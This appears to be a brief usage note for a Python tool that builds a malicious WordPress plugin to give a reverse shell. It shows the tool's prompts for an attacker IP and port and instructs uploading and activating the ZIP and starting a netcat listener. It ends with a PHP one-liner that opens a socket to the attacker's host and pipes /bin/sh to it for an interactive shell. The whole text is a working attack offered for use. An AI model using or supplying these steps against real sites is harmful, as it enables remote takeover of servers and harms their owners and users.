usage wp-plugin.py 
Enter the IP address for reverse shell connection: <YOUR IP>
Enter the port for reverse shell connection: <PORT>
Plugin ZIP created at reverse_shell_plugin.zip. Upload this to WordPress and activate it.                                            

Now upload reverse_shell_plugin.zip and start a netcat listener to <PORT> to get a revershell, the shell 



This shell is not an interactive shell, after getting the shell if you want a fully interactive shell do this

```bash
php -r '$sock=fsockopen("<IP>",<NEW PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'
```
